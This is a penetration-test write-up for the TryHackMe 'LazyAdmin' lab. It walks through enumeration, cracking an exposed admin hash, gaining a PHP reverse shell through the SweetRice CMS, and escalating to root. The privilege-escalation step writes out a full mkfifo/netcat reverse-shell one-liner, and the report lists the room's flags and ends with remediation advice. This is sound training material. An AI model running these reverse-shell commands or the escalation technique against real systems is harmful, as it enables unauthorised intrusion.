# Project: LazyAdmin Penetration Test (TryHackMe)

**Date:** December 2025

**Target:** 10.65.136.171 (LazyAdmin)

**Tools Used:** Nmap, Gobuster, CrackStation, Netcat

**Vulnerability Explored:** Information Disclosure \& SUID Misconfiguration

## 1\. Executive Summary

**Objective:** Conduct a black-box penetration test on the target host "LazyAdmin" to identify vulnerabilities, gain initial access, and escalate privileges to root.
**Result:** The assessment identified a critical **Information Disclosure** vulnerability where a database backup was left in a public directory. This led to credential theft, Remote Code Execution (RCE) via the SweetRice CMS, and finally Privilege Escalation to root via a writable script executed with **sudo** privileges.



## 2\. Technical Findings \& Walkthrough

### Step 1: Reconnaissance \& Enumeration

**Objective:** Identify open ports and hidden web directories.

**Methodology:**
I performed a service scan using **Nmap** to identify active services.

```bash
nmap -sV 10.65.136.171
```

**Findings:**

* **Open Ports:** Port 80 (Apache Web Server) and Port 22 (SSH).


!\[Nmap Scan Results](img/nmap\_results.png)

* **Web Enumeration:** Using Gobuster, I discovered a `/content/` directory. Further scanning revealed an exposed backup directory.

```bash
gobuster dir -u http://10.65.136.171/content/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
!\[Gobuster Discovery](img/gobuster\_discovery.png)

* **Critical Find:** `/content/inc/mysql\_backup/` containing a SQL backup file.



### Step 2: Credential Harvesting

**Vulnerability:** Sensitive Data Exposure
**Severity:** High

**Methodology:**
I downloaded and analyzed the SQL backup file found in the public directory.

**Findings:**

* The database contained an administrator hash: `manager:42f749ade7f9e195bf475f37a44cafcb`.


!\[SQL Backup Contents](img/sql\_backup.png)

* **Cracking:** Using CrackStation, I successfully cracked the MD5 hash.

  * **Password:** `Password123`


!\[CrackStation Result](img/crackstation\_result.png)



### Step 3: Initial Compromise (RCE)

**Vulnerability:** Arbitrary File Upload / Remote Code Execution
**Severity:** Critical

**Methodology:**
I used the discovered credentials to log into the SweetRice CMS admin panel at `/content/as/`. I identified the "Ads" feature, which allows the insertion of arbitrary code.


!\[SweetRice Admin Panel](img/sweetrice\_panel.png)

**Exploitation Steps:**

1. **Payload:** I inserted a PHP Reverse Shell script into the "Ads" code block.
2. **Execution:** I started a Netcat listener (`nc -lvnp 2500`) and triggered the ad code by navigating to the corresponding `inc` directory.
3. **Access:** The server connected back to my machine, granting a shell as `www-data`.


!\[Initial Shell](img/initial\_shell.png)

**Proof of Concept:**

* **User Flag:** Located at `/home/itguy/user.txt` -> `THM{63e5bce9271952aad1113b6f1ac28a07}`


!\[User Flag](img/user\_flag.png)



### Step 4: Privilege Escalation

**Vulnerability:** Insecure File Permissions (Writable Script via Sudo)
**Severity:** Critical

**Methodology:**
I checked the sudo permissions for the `www-data` user.

```bash
sudo -l
```

**Findings:**
The user can run `/usr/bin/perl /home/itguy/backup.pl` as root without a password.



!\[Sudo Permissions](img/sudo\_permissions.png)

**Exploitation:**

1. **Analysis:** I read `backup.pl` and saw it executes a system command calling `/etc/copy.sh`.
2. **Vulnerability:** The file `/etc/copy.sh` was writable by my current user.
3. **Payload Injection:** I overwrote the script with a reverse shell pointing to my machine:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc <MY\_IP> 5556 >/tmp/f" > /etc/copy.sh
```

4. **Execution:** I ran the sudo command:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

5. **Root Access:** The Perl script executed my malicious shell script as root.


!\[Root Shell](img/root\_shell.png)

**Proof of Concept:**

* **Root Flag:** Located at `/root/root.txt` -> `THM{6637f41d0177b6f37cb20d775124699f}`


!\[Root Flag](img/root\_flag.png)

---

## 3\. Remediation \& Recommendations

1. **Secure Backup Files (Critical)**
   The MySQL backup was stored in a publicly accessible web directory.

   * **Action:** Store backups outside the web root (e.g., `/var/backups`) or restrict access using `.htaccess`.

2. **Strengthen Passwords (High)**
   The administrator password (`Password123`) was extremely weak.

   * **Action:** Enforce a strong password policy requiring complexity and length.

3. **Fix File Permissions (Critical)**
   The script `/etc/copy.sh` was writable by a low-privileged user but executed by root.

   * **Action:** Change ownership of the script to root and remove write permissions for others (`chmod 700`).



---



> \*\*Disclaimer:\*\* This project was performed on the TryHackMe "LazyAdmin" room for educational purposes.

